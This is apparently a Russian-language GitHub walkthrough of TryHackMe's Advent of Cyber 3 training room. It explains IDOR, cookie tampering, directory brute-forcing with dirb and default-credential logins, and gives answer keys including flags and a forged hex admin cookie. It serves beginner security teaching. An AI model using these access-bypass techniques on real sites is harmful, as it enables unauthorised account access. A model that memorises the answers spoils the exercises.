[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Advent of Cyber 3 (2021)](https://tryhackme.com/r/room/adventofcyber3) 

Всего 30 заданий:
## Задание 1
Добро пожаловать в Advent of Cyber 2021

Начните изучать кибербезопасность за 25 дней, изучив основы и выполняя новые упражнения по безопасности для новичков 
каждый день вплоть до Рождества; рождественский календарь, но с заданиями по безопасности и без шоколада.

### Призы и сертификаты
У нас есть призы на сумму более 19 000 долларов! В этом событии очки не имеют значения, а вот количество вопросов, 
на которые вы ответили, имеет значение. За каждое правильное задание вы получаете лотерейный билет, и 26 декабря мы 
случайным образом выберем победителей, используя лотерейные билеты всех участников; чем больше вопросов вы ответите, 
тем больше у вас шансов на победу. Вот призы, которые можно выиграть:   

- 5 курсов PWK + 30-дневный доступ к лаборатории + сертификация по экзамену OSCP (4995 долл. США)
- 4 ноутбука ASUS ZenBook 14 8 ГБ ОЗУ , 512 ГБ SSD, Intel i5 (4000 долл. США)
- 35 ваучеров на экзамен сертифицированного специалиста Burp Suite (3225 долл. США)
- 20 ваучеров на испытательные полигоны (380 долл. США)
- 5 курсов Attacking Windows AD Throwback (425 долл. США)
- 2 компьютера Raspberry Pi 400 (244 долл. США)
- 2 кабеля HAK5 O.MG (240 долл. США)

- 2x Расширенная эмуляция угроз: Red Teams BCSecurity ($3798)
- 4x Ваучера на экзамен CompTIA Security+ ($1164)
- 5x Ваучеров TryHackMe Swag номиналом $30 ($150)
- 2x HAK5 Wifi Pineapple ($200)
- 2x HAK5 Rubber Ducky ($100)
- 15x Подписок TryHackMe ($150)

Общая стоимость призового фонда: $19,121

Кроме того, каждый день, когда вы выполняете задание, вы участвуете в другом розыгрыше призов, чтобы получить шанс 
выиграть мини-приз. «Ежедневные призы» разыгрываются в конце недели.  Выполните все задания в событии и получите 
сертификат о завершении! Убедитесь, что ваше имя указано в настройках.  

### Посмотреть образец сертификата

Наши спонсоры
В преддверии Рождества мы собрали вместе несколько крупнейших имен в сфере кибербезопасности и очень рады, что они 
поддерживают мероприятие, предоставляя призы! 

CompTIA — это глобальная некоммерческая ассоциация ИТ-торговли и создатель нейтральных ИТ-сертификаций. Сертификации 
CompTIA разрабатываются при поддержке ведущих технологических компаний и проверяются отраслевыми экспертами по всему 
миру.  


Offensive Security предлагает определяющее отрасль обучение информационной безопасности. В дополнение к курсам и 
сертификациям студенты могут получить практическую практику пентестинга в наших лабораториях Proving Grounds. 
Повышайте уровень своих навыков и изучайте мышление Try Harder с командой, стоящей за сертификацией OSCP.  

PortSwigger — создатели Burp Suite, ведущего в мире инструментария для тестирования безопасности веб-приложений. Их 
центр передового опыта — исследовательская группа PortSwigger, где они находят и эксплуатируют уязвимости, а затем 
вносят свои выводы обратно в продукты Burp Suite.

Безопасность Британской Колумбии
Компания BC Security проводит оценку кибербезопасности по широкому спектру дисциплин и обладает не только 
техническими знаниями, но и глубоким пониманием правил соответствия и мер по снижению рисков, которые имеют решающее 
значение для ведения бизнеса в современном мире.  


Видеоролики с описанием. Каждое выпущенное задание сопровождается видеоруководством от ряда замечательных и 
талантливых создателей, в том числе: 
CyberSecMeg, Джон Хаммонд, Tib3rius, Нил Бриджес, HuskyHacks, InsiderPhD и NahamSec!



### темы, которые будут рассмотрены на мероприятии:

- Эксплуатация Интернета 
- Эксплуатация сети OSINT 
- Взлом облака 
- Защитная синяя команда
### Ответить на вопросы ниже
Прочитайте вышеизложенное и ознакомьтесь со спонсорами.

```commandline
Ответ не нужен
```

## Задание 2
### Ответить на вопросы ниже
Подпишитесь на нас в LinkedIn !
```commandline
Ответ не нужен
```
Присоединяйтесь к нашему Discord и поздоровайтесь!
```commandline
Ответ не нужен
```
Следуйте за нами на Twitter !
```commandline
Ответ не нужен
```
Загляните на сабреддит !
```commandline
Ответ не нужен
```

## Задание 3
Подписка
Событие Advent of Cyber полностью бесплатное! Однако ознакомьтесь с некоторыми причинами, по которым стоит подписаться: 
Если вы хотите подарить VIP-подписку TryHackMe, вы можете приобрести ваучеры.

В честь Advent of Cyber вы можете получить скидку 20% на годовую подписку, используя код скидки AOC2021 при 
оформлении заказа. Эта скидка действительна только до 7 декабря, то есть в:  


Завершение Advent of Cyber как организации

Advent of Cyber — это идеальное мероприятие для знакомства и повышения квалификации множества различных команд в 
вашей компании в области кибербезопасности в рамках этого увлекательного 25-дневного мероприятия!

С помощью панели управления TryHackMe для бизнеса команды вашей компании могут совместно решать ежедневные задачи, а 
вы сможете отслеживать их прогресс и предоставлять им первоклассный опыт обучения.

### Рождественские сувениры

Хотите представить сувениры от вашей любимой платформы обучения кибербезопасности?
У нас есть специальный выпуск футболок Christmas Advent of Cyber. Купите в нашем магазине сувениров.

### Ответить на вопросы ниже
Прочитайте вышеизложенное.
```commandline
Ответ не нужен
```

## Задание 4
### Краткое руководство

Для доступа к целевым машинам, которые вы разворачиваете на TryHackMe, вам нужно будет либо использовать клиент 
OpenVPN, либо развернуть собственный веб-ориентированный AttackBox ( вы можете сделать это, нажав синюю кнопку 
«Запустить AttackBox» в верхней части этой страницы ).  Мы настоятельно рекомендуем вам пройти обучающую  комнату, 
чтобы узнать больше о подключении.   

Используя веб-ориентированный AttackBox, вы можете выполнить все эти упражнения через браузер. Если вы постоянный 
пользователь, вы можете развернуть AttackBox бесплатно на 1 час в день, если вы подписаны, вы можете развернуть его 
на неограниченное количество времени!   


###  Правила
Нарушение любого из следующих правил приведет к исключению из соревнования.
- *.tryhackme.com и сервер OpenVPN недоступны для зондирования, сканирования или эксплуатации.
- Пользователям разрешено взламывать только те машины, которые установлены в комнатах, к которым у них есть доступ.
- Пользователи не должны нападать на других пользователей или преследовать их.
- Пользователи должны войти в мероприятие только один раз, используя одну учетную запись.
- Ответы на вопросы не подлежат разглашению, за исключением случаев, когда они показаны на видео/трансляциях.
### Ответить на вопросы ниже
Потренируйтесь подключаться к нашей сети!
```commandline
Ответ не нужен
```

## Задание 5
[Рождественская история]

Все упражнения в Advent of Cyber следуют веселой рождественской истории. В этом году эльфу МакСкиди нужна ваша 
помощь, чтобы взломать и отменить вредоносные действия Гринча.                                                                 

Наступил канун 30 ноября — МакСкиди сидит в своем большом офисе с чашкой горячего какао, вспоминая напряженные 
времена в Best Festival Company. С тех пор, как она возглавила кибератаки Christmas Monster в декабре прошлого года, 
ее повысили до начальника отдела информационной безопасности (CISO), и ей удалось создать команду безопасности 
мирового класса. Она дала обещание никогда не позволять Рождеству быть затронутым киберинцидентами и сделала все 
возможное, чтобы подготовить лучшую фестивальную компанию к любым инцидентам и помочь Санте доставлять подарки по 
всему миру без сбоев!     

Пока она усмехается про себя: «После всего, что мы сделали, что может пойти не так?», Эльф МакАссистент вбегает в ее 
кабинет и ахает: «Все наши аналитики по безопасности пропустили свою последнюю смену, и в здании нет ни одного 
сотрудника службы безопасности». МакСкиди вскакивает со своего стула и проливает на себя горячий какао: «ЧТО?»  

Она быстро направляется в Центр безопасности Elf, где размещается персонал службы безопасности, и осматривает 
большую зону, заполненную пустыми столами. Куда все подевались накануне самого важного времени для Лучшей 
Фестивальной Компании? Она спешит к столу руководителя своей команды аналитиков по безопасности, Elf McLeader, и 
замечает, что стол на удивление чист. Как может быть, что у кого-то настолько грязного, его рабочее место совершенно 
пусто? Когда она начала рассуждать в голове, она заметила небольшой листок бумаги, спрятанный в задней части стола 
за экраном. Когда она поняла, что было на бумаге, ее глаза расширились — почему McProfessional забронировала билет в 
один конец именно в этот день!      

Прежде чем она успела сделать какие-либо предположения, громкий, сварливый голос разнесся по центру безопасности из 
внутренних систем оповещения: «Grinch Enterprises никогда не допустит успеха Рождества. Было бы обидно, если бы ваша 
первоклассная команда по безопасности просто внезапно исчезла».  

« ВСЕ ЭТО БЫЛО СПЛАНИРОВАНО — КАК ОНИ ПОЛУЧИЛИ ДОСТУП К НАШИМ ВНУТРЕННИМ СИСТЕМАМ?» — воскликнул Макскиди. Их 
разведывательная группа подготовилась именно к такому сценарию, но не помогло то, что центр безопасности был 
совершенно пуст!  

«Этому нужно положить конец», — вздохнула МакСкиди и поплелась в офис, чтобы спасти Рождество.

Обратите внимание, что задания появляются ежедневно и будут различаться по сложности  (хотя всегда будут нацелены на 
начальный уровень). 

### Ответить на вопросы ниже
В некоторых заданиях используется рождественская история, поэтому обязательно прочтите вышеизложенное.


```commandline
Ответ не нужен
```

## Задание 6
Посмотрите видео Джона Хаммонда, открывающее Advent of Cyber 3 , здесь

### История

Системы управления запасами, используемые для создания подарков, были взломаны, чтобы разозлить эльфов. Это ночная 
смена, и Макстокер приходит к Макскиди в панике из-за того, что все подарки сделаны неправильно. Поскольку рядом нет 
менеджеров, которые могли бы исправить проблему, Макскиди нужно как-то получить доступ и исправить систему, а также 
держать все в порядке, чтобы быть готовым к Рождеству!   

Цели обучения
- Что такое уязвимость IDOR ?
- Как найти и использовать уязвимости IDOR ?
- Прохождение задания.
### Что такое уязвимость IDOR ?
IDOR означает Insecure Direct Object Reference и является типом уязвимости контроля доступа. Уязвимость контроля 
доступа возникает, когда злоумышленник может получить доступ к информации или действиям, не предназначенным для него.
Уязвимость IDOR может возникнуть, когда веб-сервер получает предоставленные пользователем входные данные для 
извлечения объектов (файлов, данных, документов), и слишком большое доверие было оказано этим входным данным, и 
веб-приложение не проверяет, должен ли пользователь на самом деле иметь доступ к запрошенному объекту.

### Как найти и использовать уязвимости IDOR?
Как упоминалось ранее, уязвимость IDOR основана на изменении данных, предоставленных пользователем. Эти данные, 
предоставленные пользователем, в основном можно найти в следующих трех местах: 

Компонент запроса: Данные компонента запроса передаются в URL при выполнении запроса к веб-сайту. Возьмем, к 
примеру, следующий снимок экрана URL.

Мы можем разбить этот URL на следующие части:
- Протокол:  https://
- Домен:  website.thm
- Страница:  /профиль
- Компонент запроса:  id=23

Здесь мы видим, что запрашивается страница /profile, а параметр  id  со значением 23 передается в компоненте запроса.
Эта страница потенциально может показывать нам персональную информацию пользователя, и, изменив параметр id на 
другое значение, мы могли бы просматривать данные других пользователей.  

Переменные сообщения: Изучение содержимого форм на веб-сайте иногда может выявить поля, которые могут быть уязвимы для эксплуатации IDOR. Возьмем, к примеру, следующий HTML-код для формы, которая обновляет пароль пользователя.
```commandline
<form method="POST" action="/update-password">
    <input type="hidden" name"user_id" value="123">
    <div>New Password:</div>
    <div><input type="password" name="new_password"></div>
    <div><input type="submit" value="Change Password">
</form>
```


Из выделенной строки видно, что идентификатор пользователя передается на веб-сервер в скрытом поле. Изменение 
значения этого поля с 123 на другой user_id может привести к изменению пароля для учетной записи другого пользователя. 

Печенье:

Чтобы оставаться авторизованным на таком веб-сайте, как этот, используются файлы cookie для запоминания сеанса. 
Обычно это включает отправку идентификатора сеанса, который представляет собой длинную строку случайного, трудно 
угадываемого текста, например,  5db28452c4161cf88c6f33e57b62a357,  который веб-сервер безопасно использует для 
извлечения вашей пользовательской информации и проверки сеанса. Однако иногда менее опытные разработчики могут 
хранить пользовательскую информацию в самом файле cookie, например идентификатор пользователя. Изменение значения 
этого файла cookie может привести к отображению информации другого пользователя. Ниже приведен пример того, как это 
может выглядеть.      
```commandline
GET /user-information HTTP/1.1
Host: website.thm
Cookie: user_id=9
User-Agent: Mozilla/5.0 (Ubuntu;Linux) Firefox/94.0

Hello Jon!


GET /user-information HTTP/1.1
Host: website.thm
Cookie: user_id=5
User-Agent: Mozilla/5.0 (Ubuntu;Linux) Firefox/94.0

Hello Martin!
```

IDOR в дикой природе Увидеть идентификатор продукта, пользователя или услуги в URL или иным образом — это 
обязательно для тестирования. Уязвимости IDOR могут раскрыть конфиденциальную информацию, а также потенциально 
предоставить вам доступ к обычно ограниченным функциональным возможностям сайта. Для исследователей безопасности 
уязвимости IDOR могут иметь последствия, и сообщение о них может принести хорошую премию за ошибку; см. эту  статью ,
где отчет об уязвимости IDOR в PayPal принес выплату в размере 10 500 долларов США.

### Прохождение задания

Нажмите зеленую кнопку «Просмотр сайта» в правом верхнем углу этой задачи, чтобы открыть систему управления запасами.

Здесь вы найдете макет браузера на  странице выполненных заказов  , показывающий изображения игрушек, которые были 
сделаны неправильно из-за вмешательства Гринча! 

На панели навигации также есть три другие страницы: «Сборки», «Инвентарь» и «Ваша активность».
- На странице сборки показаны   различные игрушки и детали, из которых они состоят (как вы видите, из-за подделки все 
они неверны).
- На странице «Инвентарь» перечислены   отдельные товары с соответствующими им кодами SKU.
- На странице « Ваша  активность»  отображается информация о пользователе McSkidy, фотография и его последние 
  действия в системе.
Как мы узнали выше, уязвимость IDOR требует изменения какого-либо пользовательского ввода. Из всех страниц, на 
  которые мы можем перейти, единственная страница, на которой есть ввод, который можно изменить, находится на 
  странице «  Ваша активность»  . В URL вы увидите параметр компонента запроса с именем  user_id,  который 
  установлен на значение  11  (McSkidy's User Id).   

Попробуйте изменить  значение user_id  в адресной строке, и вы увидите, что веб-приложение пытается загрузить 
информацию другого пользователя. Попробуйте разные числа в диапазоне от 1 до 20, пока не найдете пользователя, 
который мог быть ответственным за взлом системы.  

Нажатие  кнопки «Вернуть»  в действиях пользователя откатит изменения и позволит машине для изготовления игрушек 
снова производить правильно построенные игрушки. После того, как все изменения будут отменены, вы будете 
вознаграждены флагом, который можно ввести ниже.  

### Ответить на вопросы ниже
После того, как вы нашли счет Санты, какова его должность в компании?
```commandline
The Boss!
```
После того, как вы нашли счет Макстокера, какова его должность в компании?

```commandline
Build Manager
```
Какую должность в компании вы занимаете после обнаружения аккаунта, ответственного за несанкционированный доступ?

```commandline
Mischief Manager
```
Какой флаг выдается, когда McSkidy исправляет систему управления запасами?

```commandline
THM{AOC_IDOR_2B34BHI3}
```
Если вы хотите узнать больше об уязвимостях IDOR, предлагаем вам посетить эту комнату https://tryhackme.com/room/idor
```commandline
Ответ не нужен
```
Задания, которые выпускаются каждый день, постепенно усложняются (но все еще сопровождаются видео-руководствами). 
Возвращайтесь завтра за заданием 2-го дня! 
```commandline
Ответ не нужен
```

## Задание 7
Посмотрите видеообзор Джона Хаммонда на второй день  здесь

История

McSkidy нужно проверить, не ушли ли другие эльфы-сотрудники/не пострадали ли они от атаки Grinch Industries, но 
системы, в которых хранится информация о сотрудниках, были взломаны. Можете ли вы взломать их обратно, чтобы 
определить, пострадали ли другие команды в Best Festival Company?  

### Цели обучения
- Понимание базовой технологии веб-серверов и принципов взаимодействия в сети.
- Узнайте, что такое файлы cookie и каково их назначение.
- Узнайте, как манипулировать файлами cookie и управлять ими в вредоносных целях.
### HTTP (С)
Для связи вашего компьютера и веб-сервера друг с другом требуется промежуточный протокол. Вот тут-то и появляется 
HTTP (протокол передачи гипертекста)! Протокол HTTP — это клиент-серверный протокол, обеспечивающий связь между 
клиентом и веб-сервером. Запросы HTTP похожи на стандартный сетевой запрос TCP; однако HTTP добавляет к запросу 
специальные заголовки для идентификации протокола и другой информации.

При создании  HTTP- запроса всегда будут включены заголовок метода  и  цели  . Заголовок цели будет указывать, что 
именно нужно получить с сервера, а заголовок метода будет указывать, как это сделать. 

При получении информации с веб-сервера обычно используется  метод GET  , например, для загрузки изображения.

При отправке данных на веб-сервер обычно используется метод  POST  , например, для отправки данных для входа в систему.

Пример запроса
```commandline
GET / HTTP/1.1
Host: tryhackme.com
User-Agent: Mozilla/5.0 Firefox/87.0
Referer: https://tryhackme.com/
```

Получив запрос, сервер отправит ответ, включая запрошенный контент в случае успеха и код статуса. Код статуса 
используется для того, чтобы сообщить браузеру клиента, как веб-сервер интерпретировал запрос. Наиболее 
распространенным «успешным» кодом статуса является HTTP 200 OK.  

Пример ответа
```commandline
HTTP/1.1 200 OK
Server: nginx/1.15.8
Date: Wednesday, 24 Nov 2021 13:34:03 GMT
Content-Type: text/html
Content-Length: 98

<html>
<head>
    <title>Advent of Cyber</title>
</head>
<body>
    Welcome To Advent of Cyber!
</body>
</html>
```

Сам протокол — это лишь малая часть головоломки; как только содержимое извлечено с веб-сервера, вашему браузеру 
нужен способ интерпретировать и отображать отправленную информацию. Веб-приложения обычно форматируются в HTML (язык 
гипертекстовой разметки), визуализируются и стилизуются в CSS (каскадные таблицы стилей). JavaScript также часто 
используется для предоставления дополнительных функций.   

В современной веб-среде использование веб-фреймворков значительно возросло в популярности. Большинство современных 
веб-приложений используют множество веб-фреймворков и других веб-решений, которые конечный пользователь не видит и с 
которыми не взаимодействует.  

Более подробную информацию о HTTP-запросах, методах и заголовках можно найти в  разделе «Основы веб-технологий»!

### Печенье
HTTP — это протокол без сохранения состояния. Когда вы отправляете запросы на веб-сервер, сервер не может отличить 
ваш запрос от запроса кого-либо другого. Чтобы решить проблему отсутствия состояния и определить разных 
пользователей и уровни доступа, веб-сервер назначит файлы cookie для создания и управления сеансом с сохранением 
состояния между клиентом и сервером.   

Файлы cookie — это небольшие фрагменты данных (метаданные) или информации, которые локально хранятся на вашем 
компьютере и отправляются на сервер при отправке запроса. 

Файлам cookie можно присвоить любое имя и любое значение, что позволяет веб-серверу хранить любую информацию, 
которую он захочет. Сегодня мы сосредоточимся на файлах cookie аутентификации, также известных как файлы cookie 
сеанса. Файлы cookie аутентификации или сеанса используются для идентификации вас и того, какой уровень доступа 
прикреплен к вашему сеансу.   

Ниже представлена схема, описывающая назначение и использование cookie-файла от первоначального запроса до запроса 
сеанса. 



Чтобы начать процесс, когда вы отправляете запрос, такой как запрос на вход, ваш браузер обычно отправляет эту 
информацию в виде запроса POST на веб-сервер. Веб-сервер проверяет, что он получил данные, и устанавливает 
уникальный файл cookie; как упоминалось ранее, файлы cookie являются произвольными, а значения определяются 
передовой практикой или веб-разработчиком. После назначения файла cookie, пока файл cookie хранится локально в вашем 
браузере, все будущие запросы GET будут автоматически отправляться с этим файлом cookie для идентификации вас и 
вашего уровня доступа. Как только сервер получит ваш запрос GET и файл cookie, он обнаружит и десериализует ваш 
сеанс. Десериализация — это процесс взятия формата данных, такого как JSON , и его перестроения в виде объекта. В 
случае успеха веб-сервер ответит на ваш запрос ответом 200.       

Теперь, когда мы понимаем, что такое файлы cookie и как они используются, давайте углубимся в их содержание.

Компоненты файлов cookie

Файлы cookie состоят из 11 различных компонентов; описание каждого компонента можно найти в таблице ниже.


Компоненты cookie всегда готовятся парами. Основная пара — это name-value; она определит имя cookie и значение имени.
Вторая пара — это attribute-valueпара ; она определит атрибут cookie и значение атрибута. Ниже приведен пример того, 
как Set-Cookie выглядит синтаксис.  

Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly

### Манипуляции с файлами cookie
Манипулирование файлами cookie заключается в том, что файл cookie берется и изменяется для получения 
непреднамеренного поведения, определенного веб-разработчиком. Манипулирование файлами cookie возможно, поскольку 
файлы cookie хранятся локально на вашей хост-системе, что означает, что вы имеете полный контроль над ними и можете 
изменять их по своему усмотрению.

Чтобы начать изменять и манипулировать файлами cookie, нам нужно открыть наши инструменты разработчика. В Google 
Chrome инструменты разработчика называются  «Инструменты разработчика Chrome»,  а в Mozilla Firefox —  «Инструменты 
разработчика Firefox».  

Доступ к инструментам разработчика можно получить, нажав F12или Ctrl+Shift+I. После открытия инструментов 
разработчика, чтобы получить доступ к файлам cookie, перейдите на Storageвкладку в Firefox или Applicationвкладку в 
Chrome/Edge; выберите Cookiesраскрывающийся список в левой части консоли.  



Значения файлов cookie на первый взгляд могут показаться случайными; однако зачастую они имеют закодированное 
значение или смысл, который можно декодировать в непроизвольное значение, например, объект Javascript. 

С точки зрения злоумышленника вы можете декодировать значение cookie, чтобы идентифицировать базовые объекты. После 
того, как вы идентифицировали базовые объекты, вы можете изменить их так, как вам нужно. Чтобы использовать cookie, 
вам нужно будет закодировать его обратно в исходную кодировку и заменить значение cookie. Ниже приведен пример 
декодированного значения cookie.   

`{firstName:"John", lastName:"Doe", age:50, eyeColor:"blue"`

Теперь, когда у нас есть все части cookie-файлов и способы их обработки, мы можем собрать их все вместе, чтобы 
получить непреднамеренный доступ. 

Ниже приведено краткое описание того, как можно манипулировать значениями cookie-файлов.
- Получите значение cookie-файла при регистрации или создании учетной записи.
- Расшифруйте значение cookie-файла.
- Определите нотацию объекта или структуру файла cookie.
- Измените параметры внутри объекта на другие параметры с более высоким уровнем привилегий, например, admin или 
  administrator.
- Перекодируйте файл cookie и вставьте его в область значений; это можно сделать, дважды щелкнув поле значения.
- Действие с файлом cookie; это можно сделать, обновив страницу или войдя в систему.
### Дополнительные ресурсы

Для получения дополнительной информации о HTTP (s) и файлах cookie посетите другие комнаты TryHackMe.

HTTP-протокол:https://tryhackme.com/jr/httpindetail
Аутентификация: https://tryhackme.com/jr/authenticationbypass
Если вы застряли в решении этой задачи, посмотрите видео-обучение здесь

### Ответить на вопросы ниже
Откройте статический сайт в новой вкладке  здесь .
```commandline
Ответ не нужен
```
Зарегистрируйте учетную запись и проверьте файлы cookie с помощью инструментов разработчика в вашем браузере.
Как называется новый файл cookie, созданный для вашей учетной записи?
```commandline
user-auth
```
Какой тип кодировки использовался для значения cookie?
```commandline
hexadecimal
```
В каком формате объекта хранятся данные cookie-файла?
```commandline
JSON
```
Манипулируйте файлами cookie и обходите портал входа.
Каково значение cookie-файла администратора? (имя пользователя = admin)
```commandline
7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a2261646d696e227d
```
Какая командная среда не отвечает требованиям?
```commandline
HR
```
В какой командной среде есть сетевое предупреждение?
```commandline
Application
```
Если вы хотите узнать больше об обходах аутентификации, предлагаем вам посетить эту комнату https://tryhackme.com/jr/authenticationbypass  
```commandline
Ответ не нужен
```
Задания, которые выпускаются каждый день, становятся все сложнее (но все еще сопровождаются видео-прохождениями). 
Возвращайтесь завтра для задания 3-го дня, где InsiderPHD запишет видео-прохождение! 
```commandline
Ответ не нужен
```

## Задание 8
Grinch Enterprises также попытались заблокировать общение между кем-либо в компании. Они заблокировали всех из своих 
систем электронной почты, а McSysAdmin также потерял доступ к своей панели администратора. Можете ли вы найти панель 
администратора и помочь восстановить общение для Best Festival Company.  

Посмотрите видео-обзор InsiderPHD на третий день  здесь

### Цели обучения
В сегодняшнем задании мы будем использовать наши навыки и методы расследования, чтобы обнаружить неучтенный контент, 
а также попытаемся провести простую аутентификацию, используя имеющиеся вокруг нас подсказки. 



#### Что такое Content Discovery и почему это полезно?
Прежде чем начать искать контент, давайте определим, что такое «контент». Контент — это активы и внутренняя работа 
приложения, которое мы тестируем. Контент может быть файлами, папками или путями, которые не обязательно 
предназначены для доступа широкой публики.  

Например, у вас может быть блог, в котором вы публикуете посты о своих вкусняшках! Вы хотите, чтобы все видели все 
ваши вкусняшки, но не хотите, чтобы все могли управлять тем, какие вкусняшки выставлены на обзор - вы можете скрыть 
панель администратора от публики!  



Давайте остановимся на этом подробнее. Веб-серверы, если не настроены иначе, предназначены для обслуживания этих 
файлов и папок, если вы знаете их имена. 



Обнаружение контента — это полезный метод, который стоит иметь в своем арсенале, поскольку он позволяет нам находить 
то, что мы не должны видеть. Например, мы можем найти: 
- Файлы конфигурации
- Пароли и секреты
- Резервные копии
- Системы управления контентом
- Панели управления или порталы администратора
Это лишь некоторые примеры типов информации, которые мы можем раскрыть, обнаруживая контент. Мы можем найти эти 
фрагменты информации, поскольку они хранятся либо в папке (у которой будет имя), либо в файле (у которого будет и 
имя, и расширение). Это означает, что мы можем искать файлы по их расширению, например, обнаруживая текстовые файлы 
с расширением .txt.   

Вы можете сделать это вручную, придумав несколько имен, например « admin » или « passwords.txt » и перейдя к ним в 
браузере. Однако мы можем использовать инструменты, которые сделают этот процесс за нас значительно быстрее. Введите 
Dirbuster. Dirbuster — это инструмент, который мы можем использовать для автоматизации этого процесса. Инструмент 
работает, принимая список слов, который представляет собой файл, содержащий все, что мы хотим искать, а затем 
несколько других аргументов. Давайте продемонстрируем это в приведенных ниже фрагментах:    

Мой список слов
```commandline
cmnatic@thm$ cat wordlist.txt

admin/
docs/
config/
install/
install-en/
```
Dirbuster просканирует веб-сайт "santascookies.thm" на наличие папок, перечисленных в этом списке слов. Чтобы 
использовать Dirbuster для обнаружения контента на этом сайте, мы используем команду dirbи предоставим некоторую 
информацию, такую ​​как URL-адрес веб-сайта и местоположение списка слов. Наша окончательная команда будет выглядеть 
примерно так, как показано ниже::   



Пример команды Dirbuster
`cmnatic@thm$ dirb http://santascookies.thm/ /usr/share/wordlists/mywordlist.txt`
Выше мы предоставили Dirbuster следующие команды:

URL-адрес веб-сайта
Расположение (полный путь) на нашей атакующей машине нашего списка слов. Если вы не знакомы с этим, ознакомьтесь с 
Linux Fundamentals. 
Теперь, как только мы выполним эту команду, Dirbuster выполнит поиск каталога на веб-сайте, используя каждое 
значение в созданном нами списке слов.  

Примеры списков слов для использования с Dirbuster
```commandline
cmnatic@thm:/usr/share/wordlists/dirb# ls 

big.txt     euskera.txt            mutations_common.txt  spanish.txt
catala.txt  extensions_common.txt  others                stress
common.txt  indexes.txt            small.txt             vulns
```



Ваша способность обнаруживать контент настолько хороша, насколько хорош ваш список слов. Вы найдете еще одну 
коллекцию списков слов с открытым исходным кодом, например SecLists , где вы можете использовать комбинацию 
контекста и списка слов для обнаружения контента.  



### Учетные данные по умолчанию
Веб-приложения и сервисы часто поставляются с парой учетных данных по умолчанию. Разработчики оставляют эти учетные 
данные на месте, чтобы вы могли быстро начать работу с платформой (в надежде, что вы их измените). Однако, как вы 
обнаружите, не все так делают, или, по сути, приложения часто включают другие учетные записи, которые не очень 
хорошо документированы. SecLists также предоставляют список слов для учетных данных по умолчанию, который вы можете 
найти здесь .    

Например, попробуйте использовать некоторые общие комбинации имен пользователей и паролей для привилегированных 
пользователей. Это может включать: 


Иногда эти учетные данные хранятся в файлах конфигурации веб-приложений или в общедоступной документации. Например, 
это приложение, "BikeIT", является приложением с открытым исходным кодом для регистрации вашего велосипеда на 
странице сообщества. Администратор включен по умолчанию, учетные данные указаны как в документации, так и в исходном 
коде.   

  

На фотографии выше показана документация «Read Me» (или инструкции) для веб-приложения.

$username="Administrator";

$password="letmein123"; //change this

Исходный код также содержит эти учетные данные по умолчанию.

Если администратор, устанавливающий это приложение, не изменит учетные данные, любой сможет войти в систему, 
используя их, если он знает, что эти данные следует искать в опубликованных данных (как это обычно бывает в проектах 
с открытым исходным кодом), или способен угадать их.  



Для выполнения сегодняшнего задания вам необходимо будет развернуть уязвимую машину, прикрепленную к этому заданию, 
нажав зеленую кнопку «Запустить машину» в правом верхнем углу этого задания , а также TryHackMe AttackBox, который 
можно развернуть, нажав кнопку «Запустить AttackBox», расположенную в правом верхнем углу комнаты.  

### Дополнительные ресурсы
Если вы заинтересованы в получении дополнительной информации (или хотите применить свои знания) об обнаружении 
контента и обходе аутентификации, посетите следующие разделы на TryHackMe: 

Контент-дискаут
Обход аутентификации  
### Ответить на вопросы ниже
Используя общий список слов для обнаружения контента, перечислите http://MACHINE_IP, чтобы найти местоположение 
панели администратора. Каково имя папки? 

```commandline
admin
```
В вашем веб-браузере попробуйте ввести  некоторые учетные данные по умолчанию в недавно обнаруженной форме входа для 
пользователя " administrator ". Какой пароль? 
```commandline
administrator
```
Зайдите в админ-панель. Каково значение флага?
```commandline
THM{ADM1N_AC3SS}
```

## Задание 9
McSysAdmin удалось сбросить доступ всех, кроме Санты! Санта ожидал какой-то срочный маршрут поездки на Рождество. Ходят слухи, что Санта никогда не следовал рекомендациям по безопасности паролей. Можно ли использовать перебор паролей, чтобы помочь ему получить доступ к своим аккаунтам?

Посмотрите видео-обучение Нахамсека на 4-й день  здесь
### Цели обучения
В сегодняшнем задании мы узнаем следующее.
- Понимание аутентификации и ее применения
- Понимание того, что такое фаззинг
- Понимание того, что такое Burp Suite и как мы можем использовать его для фаззинга формы входа в систему с целью 
  получения доступа
Примените эти знания, чтобы восстановить маршрут путешествия Санты. 

#### Что такое аутентификация и где она используется?
Аутентификация — это процесс проверки личности пользователя, устанавливающий, что он тот, за кого себя выдает. 
Аутентификация может быть подтверждена с помощью различных средств аутентификации, включая: 

Известный набор учетных данных для сервера и пользователя, такой как имя пользователя и пароль.
Аутентификация токенов (это уникальные фрагменты зашифрованного текста)
Биометрическая аутентификация (отпечатки пальцев, данные сетчатки глаза и т. д.)


Аутентификация часто используется взаимозаменяемо с авторизацией, но это совсем другое. Авторизация — это термин для 
правил, определяющих, к чему  аутентифицированный  пользователь может и не может получить доступ. Например, стандарт,
аутентифицированный пользователь будет иметь доступ только к некоторым аспектам веб-сайта. Аутентифицированный 
администратор сможет получить доступ ко всему — его уровень авторизации определяет это.   

Аутентификация используется, когда необходимо знать, кто получает доступ к данным или информации, чтобы создать 
подотчетность — защищая   элемент Конфиденциальности триады ЦРУ . Если вы хотите узнать больше об этом, я рекомендую 
ознакомиться с  Principles of Security room на TryHackMe . Вы можете найти примеры аутентификации в реальном мире, 
например, значок или ключ-карта для доступа к закрытым местам в здании.   

 

### Что такое фаззинг?
Проще говоря, фаззинг — это автоматизированный способ тестирования элемента веб-приложения до тех пор, пока 
приложение не выдаст уязвимость или ценную информацию. Когда мы фаззинг, мы предоставляем информацию так же, как мы 
обычно это делаем при взаимодействии с ней, просто с гораздо большей скоростью. Это означает, что мы можем 
использовать обширные списки, известные как списки слов, для тестирования реакции веб-приложения на различную 
информацию.    

Например, вместо того, чтобы поочередно проверять форму входа на наличие допустимого набора учетных данных (что 
отнимает исключительно много времени), мы можем использовать инструмент для фаззинга этой формы входа, чтобы гораздо 
быстрее и надежнее проверить сотни учетных данных.   

Фаззинг с помощью Burp Suite
Обратите внимание, что эта задача предполагает, что вы используете TryHackMe AttackBox. AttackBox имеет необходимое 
программное обеспечение, инструменты и списки слов, установленные для выполнения сегодняшней задачи, поэтому 
настоятельно рекомендуется использовать его (чтобы запустить его, прокрутите страницу вверх и нажмите синюю кнопку 
«Запустить AttackBox», затем следуйте инструкциям ниже).   

